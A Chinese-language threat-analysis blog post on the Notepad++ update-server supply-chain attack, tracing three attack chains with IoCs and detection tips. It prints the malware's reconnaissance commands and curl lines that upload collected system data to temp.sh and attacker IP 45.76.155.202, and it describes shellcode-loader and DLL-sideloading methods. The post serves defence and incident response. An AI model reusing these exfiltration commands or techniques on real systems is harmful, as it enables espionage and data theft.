---
title: Notepad++供应链攻击--疑似国家级黑客实施的供应链攻击
url: https://mp.weixin.qq.com/s/p4_LK6ssINlxMCVAKgnGwg
source: Doonsec's feed
date: 2026-02-12
fetch_date: 2026-02-13T04:15:16.285150
---

# Notepad++供应链攻击--疑似国家级黑客实施的供应链攻击

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/5FtPcWDnic0d2J98dlco8nGe64D1TOQjKcOfGWuJzMCPTDjiadXhfYkQibNdpAVYl0TYibkSMZPmMvYDVEUPqwaEHkpjKGL2ExDt4zzcibv52ajU/0?wx_fmt=jpeg)

# Notepad++供应链攻击--疑似国家级黑客实施的供应链攻击

原创

ybdt
ybdt

卡卡罗特取西经

![]()

在小说阅读器中沉浸阅读

# 前言

2026年2月2日，Notepad的开发者发布声明宣称，Notepad的更新服务器被恶意攻击者控制，导致下发恶意软件，并宣称这是一场国家级的黑客攻击

声明中指出问题出在主机托管服务商，攻击者通过重定向Notepad++的更新流量到攻击者控制的服务器，来进一步下发恶意软件，攻击从2025年6月一直持续到12月

此次攻击十分隐蔽，攻击者仅对特定目标下发恶意软件，并在攻击期间多次更改攻击手法、C2服务器地址、恶意程序等等，其中部分攻击目标如下

* • 位于越南、萨尔瓦多和澳大利亚的个人
* • 位于菲律宾的政府机构
* • 一家位于萨尔瓦多的金融机构
* • 一家位于越南的IT服务提供商组织

# 攻击链1 - 2025年7月末到8月初

攻击者首次部署恶意Notepad++更新于2025年7月末，重定向到：http://45.76.155.202/update/update.exe

值得一提的是，有一位IP归属是台湾的用户于9月末将这个URL上传到了VirusTotal

上述URL下载的update.exe的SHA1是：8e6e505438c21f3d281e1cc257abdbf7223b7f5a，由合法的Notepad++更新进程GUP.exe启动，它实际上是一个NSIS安装包，大约1MB，当启动的时候，它会首先发送包含系统信息的HTTP请求到攻击者控制的服务器，具体步骤如下：

1. 1. 创建目录%appdata%\ProShow，并将它设置为当前工作目录
2. 2. 执行下述命令获取系统信息

```
cmd /c whoami&&tasklist > 1.txt
```

1. 3. 将1.txt上传到 temp.sh（一个匿名的文件托管服务）

```
curl.exe -F "file=@1.txt" -s https://temp.sh/upload
```

1. 4. 最后将temp.sh返回的地址作为User-Agent，发送HTTP请求到攻击者控制的服务器

```
curl.exe --user-agent "https://temp.sh/ZMRKV/1.txt" -s http://45.76.155.202
```

可以看到，这是一个很新颖的方式，通过UserAgent传递收集的系统信息，防止被流量审查设备捕获

值得一提的是，早在2025年10月份，就有人在Notepad论坛上反映过，Notepad更新程序似乎存在恶意行为，https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5FtPcWDnic0eyO8hkNibHQXNcjksvba2KLW9ibNuMSSfFmesiag4FAUEj9FtxTtfT7j2rwJXETCjh8iaNxd5V3O4ic7RRq5FehlP2ff9DIDOp2G54/640?wx_fmt=other&from=appmsg)

image

发送完系统信息后，它开始执行第二阶段payload，包含2个动作

1. 1. 释放下列文件
   ProShow.exe (SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)
   defscr (SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)
   if.dnt (SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)
   proshow.crs (SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)
   proshow.phd (SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)
   proshow\_e.bmp (SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)
   load (SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)
2. 2. 执行ProShow.exe

这个ProShow.exe是一个带有数字签名的合法二进制文件，攻击者没有采用经典的白加黑技术，而是利用ProShow.exe的一个漏洞来执行攻击者的恶意文件，这种利用漏洞的方式会比白加黑更隐蔽，漏洞利用方式是ProShow.exe启动的时候，会自动加载包含漏洞利用代码的文件load，上述释放的文件中，除了load，均为合法的二进制文件

进一步分析利用代码，发现它包含2段shellcode，一段位于文件的开始位置，一段位于文件的中间位置，位于开始位置的shellcode包含一系列不会被执行的无意义指令，攻击者将其作为漏洞利用的填充字节，这样一段shellcode的存在很可能是想给自动化分析系统和防守专家制造麻烦

第二段shellcode位于load的中间位置，当ProShow启动的时候，它被加载到ProShow进程的地址空间中，它解密并执行一个shellcode形式的Metasploit下载器，这个下载器下载并执行一个shellcode形式的Cobalt Strike Beacon，Metasploit下载器访问的URL：https://45.77.31.210/users/admin

Cobalt Strike Beacon连接的C2地址是：cdncheck.it.com，它使用的Get请求和POST请求如下：
https://45.77.31.210/api/update/v1
https://45.77.31.210/api/FileUpload/submit

在2025年8月，攻击者不再使用之前的update.exe（SHA1：90e677d7ff5844407b9c073e3b7e896e078e11cd），但使用相同的攻击链投递Cobalt Strike Beacon，其他的变化如下

* • 在Metasploit下载器中，下载Cobalt Strike Beacon的URL变为https://cdncheck.it.com/users/admin
* • Cobalt Strike Beacon的C2服务器地址变为https://cdncheck.it.com/api/update/v1 和 https://cdncheck.it.com/api/Metadata/submit

# 攻击链2 - 2025年9月中旬到9月末

恶意攻击停止1个半月后，攻击者于2025年9月中旬再次执行攻击，并使用新的攻击链，重定向的链接依旧是：http://45.76.155.202/update/update.exe

下载的文件也是一个NSIS安装包（SHA1：573549869e84544e3ef253bdba79851dcde4963a），这一次它的大小是140KB，它执行了下面2个动作

* • 通过cmd命令获取系统信息，并上传到 temp.sh
* • 释放下一阶段payload到硬盘上，并执行它

关于系统信息的收集，攻击者做了如下改变

* • 修改工作目录为%APPDATA%\Adobe\Scripts
* • 开始收集更多的系统信息，命令变成

```
cmd /c "whoami&&tasklist&&systeminfo&&netstat -ano" > a.txt
```

生成的a.txt和攻击链1中一样，首先通过curl上传到 temp.sh，temp.sh返回的地址作为User-Agent再次通过curl上传到URL：http://45.76.155.202/list

至于下一阶段payload，和攻击链1中完全不一样，NSIS安装包释放下列4个文件到目录：%APPDATA%\Adobe\Scripts

* • alien.dll (SHA1: 6444dab57d93ce987c22da66b3706d5d7fc226da)
* • lua5.1.dll (SHA1: 2ab0758dda4e71aee6f4c8e4c0265a796518f07d)
* • script.exe (SHA1: bf996a709835c0c16cce1015e6d44fc95e08a38a)
* • alien.ini (SHA1: ca4b6fe0c69472cd3d63b212eb805b7f65710d33)

最终，通过下列命令启动script.exe

```
%APPDATA%\%Adobe\Scripts\script.exe %APPDATA%\Adobe\Scripts\alien.ini
```

%APPDATA%\Adobe\Scripts目录下的全部文件，除了alien.ini，都是和Lua解释器相关的合法的文件，alien.ini是编译后的lua脚本，下图是反编译后的的内容
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5FtPcWDnic0eAUJNzTBCsD1J60KJmZxU5ibs0FjysscVG9rd5tDEP77MoibZMnkltvsmI3GVXod5NqXQN1OqIcot4bG3IrIoLdJwbZk1qyXMI8/640?wx_fmt=other&from=appmsg)

image

阅读上图中的代码可以发现，这是经典的loader实现过程，定义shellcode后，申请内存、修改内存属性、写入内存、最后通过EnumWindowStationsW中的回调函数执行shellcode

最终执行的shellcode和攻击链1中一样，是Metasploit下载器，它下载一段Cobalt Strike beacon到内存中，beacon的形式依旧是shellcode，下载地址：https://cdncheck.it.com/users/admin

Cobalt Strike beacon中包含的C2服务器地址和攻击链1中稍微有些不同：
https://cdncheck.it.com/api/getInfo/v1
https://cdncheck.it.com/api/FileUpload/submit

攻击链2持续到2025年9月末，此时有2个新的恶意update.exe出现，其中一个update.exe的SHA1是：13179c8f19fbf3d8473c49983a199e6cb4f318f0，它连接的C2地址和之前一样，但是收集系统信息有些不同，从之前的

```
cmd /c "whoami&&tasklist&&systeminfo&&netstat -ano" > a.txt
```

变为多条命令

```
cmd /c whoami >> a.txt
cmd /c tasklist >> a.txt
cmd /c systeminfo >> a.txt
cmd /c netstat -ano >> a.txt
```

值得一提的是，Notepad++社区之前爆出过使用

```
cmd /c "whoami&&tasklist&&systeminfo&&netstat -ano" > a.txt
```

收集信息，这一次攻击改用别的方式收集系统信息，说明攻击者一直在关注Notepad++社区

另外一个update.exe的SHA1是：4c9aac447bf732acc97992290aa7a187b967ee2c，这个恶意update.exe攻击者做了如下改变

* • 收集到的系统信息上传到新的URL：https://self-dns.it.com/list
* • HTTP请求的User-Agent改为：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
* • Metasploit下载器使用的URL变为：https://safe-dns.it.com/help/Get-Start
* • Cobalt Strike payload中C2服务器地址改为：https://safe-dns.it.com/resolve 和 https://safe-dns.it.com/dns-query

# 攻击链3 - 2025年10月

2025年10月初，攻击者再一次改变了攻击链，也改变了用于分发恶意软件的重定向地址：http://45.32.144.255/update/update.exe

下载的Payload依旧是NSIS安装包（SHA1：d7ffd7b588880cf61b603346a3557e7cce648c93），和攻击链1、攻击链2中的NSIS安装包不同的是，这个NSIS安装包不再有系统信息发送功能，只是释放下列文件到目录%appdata%\Bluetooth\

* • BluetoothService.exe：一个带有数字签名的exe，SHA1：21a942273c14e4b9d3faa58e4de1fd4d5014a1ed
* • log.dll：一个恶意dll，SHA1：f7910d943a013eede24ac89d6388c1b98f8b3717
* • BluetoothService：一个加密的shellcode，SHA1：7e0790226ea461bcc9ecd4be3c315ace41e1c122

基本攻击流程是：启动白文件BluetoothService.exe，利用白加黑技术载入log.dll，log.dll负责载入BluetoothService，在内存中解密并运行，具体细节可以看Rapid7的分析文章：https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/

发现最终解密后运行的是定制版Chrysalis后门

# 结论

Notepad是一个在全世界开发者中广泛使用的文本编辑器，正因如此，攻击者在控制Notepad的更新服务器后，可以在全世界范围内寻找高价值目标。攻击者通过定期更新攻击链（约一个月更新一次），以及仅针对特定目标植入恶意软件，来最大程度规避检测，文中讲述了三种攻击链，但根据更新频率笔者有理由猜测实际上不止这三种，下图是攻击链的时间线
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5FtPcWDnic0cIRHAIIpN8uxznAUpQiaXgV76RBhF7Ztq4ib8icg1tFk61mOByELccz0Jgqnd6TUEBuX4QulCFMicDnd3Qnia9qZibo3YHAsTvB18p8/640?wx_fmt=other&from=appmsg)

image

不断更新的攻击链使得Notepad++供应链攻击难以检测，尽管如此，笔者还是提炼了以下方式检测这类攻击

* • 上述三种攻击链都用到了NSIS安装器，可以检测系统中是否部署过NSIS安装器，部署过NSIS安装器会生成目录%localappdata%\Temp\ns.tmp，确保每一个NSIS的安装都是合法的，不要遗漏
* • 查看网络流量日志是否解析过 temp.sh，在公司网络环境下解析域名temp.sh是可疑的，以及查看原始http流量的User-Agent中是否存在 temp.sh
* • 检查系统中是否执行过上述的恶意命令，例如：whoami、tasklist、systeminfo、netstat -ano
* • 使用文中列出的IOCs标识恶意的域名和文件

# IoCs

## 恶意更新程序地址

http://45.76.155.202/update/update.exe
http://45.32.144.255/update/update.exe
http://95.179.213.0/update/update.exe
http://95.179.213.0/update/install.exe
http://95.179.213.0/update/AutoUpdater.exe

## 系统信息上传的地址

http://45.76.155.202/list
https://self-dns.it.com/list

## Metasploit下载器下载Cobalt Strike beacon的地址

https://45.77.31.210/users/admin
https://cdncheck.it.com/users/admin
https://safe-dns.it.com/help/Get-Start

## Cobalt Strike Beacon使用的C2服务器

https://45.77.31.210/api/update/v1
https://45.77.31.210/api/FileUpload/submit
https://cdncheck.it.com/api/update/v1
https://cdncheck.it.com/api/Metadata/submit
https://cdncheck.it.com/api/getInfo/v1
https://cdncheck.it.com/api/FileUpload/submit
https://safe-dns.it.com/resolve
https://safe-dns.it.com/dns-query

## Chrysalis后门使用的地址

https://api.skycloudcenter.com/a/chat/s/70521ddf-a2ef-4adf-9cf0-6d8e24aaa821
https://api.wiresguard.com/update/v1
https://api.wiresguard.com/api/FileUpload/submit

## 恶意程序Hash

06a6a5a39193075734a32e0235bde0e979c27228 — l...